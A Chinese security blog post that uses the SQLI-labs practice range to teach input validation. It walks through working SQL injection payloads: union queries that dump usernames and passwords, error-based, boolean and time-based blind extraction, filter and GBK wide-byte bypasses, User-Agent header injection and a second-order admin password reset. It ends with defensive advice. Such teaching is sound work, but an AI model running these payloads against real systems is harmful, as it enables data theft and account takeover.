---
date: '2025-02-25T21:02:50+08:00'
categories: ["安全"]
title: '永远不要相信用户的输入：从 SQL 注入攻防看输入验证的重要性'
---

学习编程之初就常被告诫：“永远不要相信用户的输入”，但实际编码中，可能因为各种原因而忽略这点，本文尝试以 SQL 注入的角度探寻校验输入的重要性

以下实验均以 [SQLI labs](https://github.com/Audi-1/sqli-labs) 靶场为例  

---

#### 1. 联合注入（Union-Based）  

来自：[Less-1](https://github.com/Audi-1/sqli-labs/tree/master/Less-1)


![](../sql-injection/1.png)

这是一个常见的查询页面。`http://127.0.0.1/Less-1/?id=1` ，通过 `id=1` 传递参数。后端常见的 SQL 写法：`SELECT * FROM users WHERE id='$id' LIMIT 0,1";`


攻击者可以通过构造 `id` 的参数值，执行任意的 SQL 语句：


![](../sql-injection/2.png)


其中关键步骤是构造 `1' --+`：
1. 通过某个具体参数 `1` 和 单引号 `'` 来结束前面的语句：`SELECT * FROM users WHERE id='`，是其成为合法的 SQL 语句： `SELECT * FROM users WHERE id='1'`
2. 通过 `--+` 来注释后面的 `' LIMIT 0,1";`


基于上面的原理，我们就可以在 `1'` 和 `--+` 之间插入语句了，进行联合注入，具体步骤如下：

1. 通过 `order by` 测列宽：`?id=-1' order by 4 --+`，通过不断尝试和错误提示可以得知列宽为 3
![](../sql-injection/3.png)

2. 判断回显值对应的位置，`?id=-1' union select 1,2,3 --+`，2 和 3 这两个位置都可供使用
![](../sql-injection/4.png)

3. 在某个可回显的位置执行 select 语句：`?id=-1' union select 1,2, database() --+`
![](../sql-injection/5.png)

你可以能会想，这又啥用呢？但实际上在没有**严格权限管理**的数据库上，我们可以通过构造下面语句获得所有库表的信息

```sql
# 1. 查库：查询所有数据库的名称
SELECT schema_name FROM information_schema.schemata
# 2. 查表：查询指定数据库中的所有表
SELECT table_name FROM information_schema.tables WHERE table_schema='security'
# 3. 查列：查询表中的所有列
SELECT column_name FROM information_schema.columns WHERE table_name='users'
# 4. 查字段：获取用户表中的敏感数据，如用户名和密码
SELECT username, password FROM security.users
```

举个例子：我们可以通过构造语句，获取所有的账户和密码，将其通过 `~` 进行分隔：`?id=-1' 
union select 1,2, group_concat(concat_ws('~',username,password)) from security.users  --+`

![](../sql-injection/5-2.png)

---

#### 2. 报错注入（Error-Based）  


来自：[Less-5](https://github.com/Audi-1/sqli-labs/tree/master/Less-5)

不是所有场景都会回显数据库值，那是否就安全了？攻击者可以通过显示的错误来获取数据库值


```sql
# 0x7e 为 16 进制编码的 ~
SELECT updatexml(1, concat(0x7e, database()), 1) FROM DUAL;
```

通过函数构造错误，将期望的信息以错误的信息提示出来：`?id=1' and updatexml(1,concat(0x7e,(database())),1); --+`


![](../sql-injection/6.png)

```sql
XPATH syntax error: '~security'
```

通过上面的错误我们就知道当前库名为：`security`，类似地可以执行任意语句

---

#### 3. 布尔盲注（Boolean-Based Blind）  

来自：[Less-7](https://github.com/Audi-1/sqli-labs/tree/master/Less-7)

一般项目都会隐藏错误堆栈，只提示成功或者失败，可以使用布尔盲注：`?id=1')) and left((select database()),1)='s'--+`

1. 通过 order by 测列宽 `?id=1')) order by 4 --+` 
2. 通过 left 函数，逐个字符地遍历判断 `?id=1')) and left((select database()),1)='s'--+ `，当前库名首字母为 `s` 时会提示正确，否则提示错误

tips：这里使用是 `?id=1'))` 有别于前文的 `1'`，这是因为不同 SQL 语句可能对变量采用不同的闭合方式，注入时要符合原 SQL 语句，否则会出现 SQL 语法错误

通过类似的原理我们可以按照行列顺序依次遍历：

```sql
# 0x7365637572697479 为 16 进制编码的 security，使用 16 进制编码可以避免使用单引号

?id=1')) and ascii(substr((select table_name from information_schema.tables where table_schema=0x7365637572697479 limit 1,1),1,1))>1--+
```
再配合二分法提高效率，最终也能得到所有库表信息


#### 4. 时间盲注（Time-Based Blind）  

来自：[Less-9](https://github.com/Audi-1/sqli-labs/tree/master/Less-9)


如果没给出提示，或者无论正确与否都给出相同提示，那该怎么办呢？可以使用时间盲注

在语句中调用 `sleep()` 函数，通过网页响应速度来判断是否为我们预期的结果

构造 `?id=10' and sleep(5) --+` 来判断当前接口是否支持时间盲注，遍历过程与布尔盲注类似，增加了 if 函数，结果符合预期返回 1，否则执行 sleep(5)

```sql
?id=1‘ and if(ascii(substr((select schema_name from information_schema.schemata limit 4,1),1,1))>1112,1,sleep(5))--+ 
```

---

#### 5. 绕过过滤（Bypass）  

来自：[Less-25](https://github.com/Audi-1/sqli-labs/tree/master/Less-25)

既然可以通过盲注来执行任意指令，那就直接加强参数的检查， replace 所有的 or 和 and

攻击者可以通过双写的方式绕过：`oorr` → 被过滤后变为 `or`，也可以通过 `||` 替代 `OR`，`&&` 替代 `AND`

```sql
# ;%00 等效于 --+ 。%00是 URL 编码表示的空字符（NUL 字符），其 ASCII 值为 0

?id=10' oorrder by 2;%00
```

---

#### 6. 宽字节注入（GBK Bypass）  


来自：[Less-32](https://github.com/Audi-1/sqli-labs/tree/master/Less-32)

既然替换保留字符也能被绕过，那就将参数中的单引号进行转义：`'` 转义为 `\'`

攻击者可以通过宽字节注入的方式使得转义符号失效，构造请求`?id=1%df' order by 4 --+`

单引号 为 `%27`，而 `\` 为 `%5c`。PHP 后端在接受到参数时发现有单引号，就自动在其前面加上`\`，变成 `\'`，即 `%5c%27`

我们在其前面加上 `%df`，构造出 `%df\'`，即 `%df%5c%27`

数据库使用 GBK 编码时 `%df%5c` 会被解码为 `運`，`\` 被“吃掉了”，单引号被保留，故可以执行我们期望的 SQL。类似的方法还有将 utf-8 转换为 utf-16 或 utf-32，将 ' 转为 utf-16


---

#### 7. Header 注入（HTTP Header Injection）  


来自：[Less-18](https://github.com/Audi-1/sqli-labs/tree/master/Less-18)


假设我严格地检查所有参数，那是否就安全了呢？

攻击者可以在插入请求头信息时进行攻击，下面为常见的登陆信息收集，`uagent` 来自用户的请求头 `User-Agent`

```
$insert="INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES ('$uagent', '$IP', $uname)";
```

在访问页面时构造 HTTP Header：`User-Agent: 'and updatexml(1,concat(0x7e,(database()),0x7e),1) and '1'= '1`，配合报错注入获得库表信息。类似的攻击还可以使用 `Referer` 和 `Cookie` 等等

---

#### 8. 二次注入（Second-Order）  


来自：[Less-24](https://github.com/Audi-1/sqli-labs/tree/master/Less-24)


假设我们对所有参数和 HTTP Header 都严格检查，肯定就安全了吧？攻击者还可以通过二次注入的方式绕过你的检查

这是一个经典的用户登陆页面，包含创建用户，登陆后可以修改用户密码

![](../sql-injection/7.png)

修改密码的 SQL 如下：

```sql
UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass'
```

攻击者可以通过构建用户 `admin'#`

![](../sql-injection/8.png)

登陆该用户修改密码，实现间接修改掉 `admin` 超级用户的密码：

![](../sql-injection/9.png)


```sql
UPDATE users SET PASSWORD='$pass' where username='admin'# and password='$curr_pass'

# 移除注释，等价于
UPDATE users SET PASSWORD='$pass' where username='admin'
```

---

#### 结尾

我们可能觉得现代框架和工具链可以避免这些问题，但通过上面的例子可以感受到，道高一尺魔高一丈，**稍有疏忽就可能被利用**

SQL注入的本质是：攻击者通过操控用户输入的方式，改变原本的SQL查询结构，从而绕过应用程序的安全策略，执行恶意指令。我们可以从不同的角度进行防御：

- 校验用户输入
- 操作前进行详尽的校验包括已入库的数据
- 细化数据库账户权限
- 结合 WAF、日志监控、定期渗透测试
- ...


SQL注入攻击揭示的不仅是技术漏洞，更指向一个通用安全原则：**任何外部输入都可能在与现有流程交互时引发非预期行为**。这一安全思维可迁移至日常生活风险防控体系：

- 查杀未知邮件的附件
- 逐一检查合同
- 对陌生通知通过官方渠道二次确认
- 仔细评审合作方提供的材料
- ...


#### 参考资料

本文只为抛砖引玉，精简了部分细节，详情可以参考以下教程：

- [SQLI labs 靶场精简学习记录](https://www.sqlsec.com/2020/05/sqlilabs.html)
- [sqli-labs基础教程/sqli-labs注入教程20200124.pptx](https://github.com/crow821/crowsec/blob/master/sqli-labs%E5%9F%BA%E7%A1%80%E6%95%99%E7%A8%8B/sqli-labs%E6%B3%A8%E5%85%A5%E6%95%99%E7%A8%8B20200124.pptx)
- [sql注入之sqli-labs系列教程(less1-10)](https://www.bilibili.com/video/BV1e441127Rd)
- [sqli-labs(62-65)-challenges-盲注](https://www.cnblogs.com/1ink/p/15115790.html)
- [sqli-labs靶场Less-62题解（少于130次）](https://ovi3.github.io/2020/12/04/sqli-labs-less-62/)

